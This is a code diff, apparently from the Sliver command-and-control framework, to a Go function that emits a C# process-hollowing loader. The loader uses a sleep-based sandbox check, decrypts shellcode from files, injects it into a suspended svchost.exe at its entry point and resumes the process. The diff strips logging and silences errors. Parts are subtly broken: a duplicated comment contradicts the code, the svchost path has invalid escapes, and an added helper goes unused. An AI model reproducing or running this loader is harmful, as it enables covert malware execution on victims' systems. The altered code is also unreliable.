@@ -933,10 +933,10 @@ func (s *Sliver) ProcessHollowPayload(opts GenerateOptions) ([]byte, []byte, []b
 	return executable, encryption.Encrypted, encryption.Key, encryption.IV, nil
 }
 
-// buildProcessHollowCS builds a minimal C# stub that reads encrypted payload from a file.
-// The stub reads "payload.bin" (encrypted shellcode) from the same directory as the executable.
+// buildProcessHollowCS builds a C# stub with embedded encrypted payload.
+// buildProcessHollowCS builds a C# stub with embedded encrypted payload.
 func buildProcessHollowCS() []byte {
-	code := `using System;
+	return []byte(`using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
@@ -1021,11 +1021,9 @@ namespace ph
                 aes.IV = iv;
                 aes.Mode = CipherMode.CBC;
                 aes.Padding = PaddingMode.PKCS7;
-
                 using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                 {
-                    byte[] plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
-                    return plaintext;
+                    return decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                 }
             }
         }
@@ -1034,104 +1032,68 @@ namespace ph
         {
             try
             {
-                // AV evasion: Sleep for 10s and detect if time really passed
                 DateTime t1 = DateTime.Now;
                 Sleep(10000);
                 double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
-                if (deltaT < 9.5)
-                {
-                    return;
-                }
+                if (deltaT < 9.5) return;
 
-                // Read encrypted payload from file
-                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                string payloadPath = Path.Combine(Path.GetDirectoryName(exePath), "payload.bin");
+                string dir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                byte[] buf = File.ReadAllBytes(Path.Combine(dir, "payload.bin"));
+                byte[] key = File.ReadAllBytes(Path.Combine(dir, "key.bin"));
+                byte[] iv = File.ReadAllBytes(Path.Combine(dir, "iv.bin"));
 
-                if (!File.Exists(payloadPath))
-                {
-                    Console.WriteLine("ERROR: payload.bin not found in same directory as executable");
-                    return;
-                }
+                byte[] shellcode = DecryptAES(buf, key, iv);
 
-                byte[] encryptedPayload = File.ReadAllBytes(payloadPath);
-                Console.WriteLine($"Loaded encrypted payload: {encryptedPayload.Length} bytes");
-
-                // Key and IV must be provided as files as well
-                string keyPath = Path.Combine(Path.GetDirectoryName(exePath), "key.bin");
-                string ivPath = Path.Combine(Path.GetDirectoryName(exePath), "iv.bin");
-
-                if (!File.Exists(keyPath) || !File.Exists(ivPath))
-                {
-                    Console.WriteLine("ERROR: key.bin or iv.bin not found");
-                    return;
-                }
-
-                byte[] key = File.ReadAllBytes(keyPath);
-                byte[] iv = File.ReadAllBytes(ivPath);
-
-                // Decrypt the payload
-                byte[] shellcode = DecryptAES(encryptedPayload, key, iv);
-                Console.WriteLine("Decrypted shellcode successfully");
-
-                // Start 'svchost.exe' in a suspended state
                 StartupInfo sInfo = new StartupInfo();
                 ProcessInfo pInfo = new ProcessInfo();
-                bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
+                bool cResult = CreateProcess(null, "c:\windows\system32\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                     false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
-                Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
 
-                // Get Process Environment Block (PEB) memory address of suspended process
                 ProcessBasicInfo pbInfo = new ProcessBasicInfo();
                 uint retLen = new uint();
                 long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
                 IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
-                Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
 
-                // Get entry point of the actual process executable
                 byte[] procAddr = new byte[0x8];
                 byte[] dataBuf = new byte[0x200];
                 IntPtr bytesRW = new IntPtr();
                 bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
                 IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
                 result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
-                Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");
 
-                // Read e_lfanew to get PE header offset
                 uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
-                Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");
-
-                // Get RVA offset
                 uint rvaOffset = e_lfanew + 0x28;
-                Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");
-
-                // Read RVA value
                 uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
-                Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");
-
-                // Get absolute entrypoint address
                 IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
-                Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");
 
-                // Overwrite the memory at the entrypoint with our payload
                 result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, shellcode, shellcode.Length, out bytesRW);
-                Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");
-
-                // Resume the thread to trigger our payload
                 uint rResult = ResumeThread(pInfo.hThread);
-                Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"ERROR: {ex.Message}");
-            }
+            catch { }
         }
     }
 }
-`
-	return []byte(code)
+`)
 }
 
-// compileCScode compiles C# code to an executable using csc (Roslyn).
+
+// toHexBytes converts bytes to a hex string suitable for C# array initialization,
+// splitting into chunks to avoid compiler limits.
+func toHexBytes(data []byte, chunkSize int) string {
+	var result strings.Builder
+	for i, b := range data {
+		if i > 0 && i%chunkSize == 0 {
+			result.WriteString(",\n                ")
+		}
+		if i > 0 && i%chunkSize != 0 {
+			result.WriteString(",")
+		}
+		result.WriteString(fmt.Sprintf("0x%02x", b))
+	}
+	return result.String()
+}
+
+
 func compileCScode(csharpCode []byte) ([]byte, error) {
 	tmpDir := "/tmp/sliver-ph-" + randomString(8)
 	csFile := tmpDir + "/payload.cs"
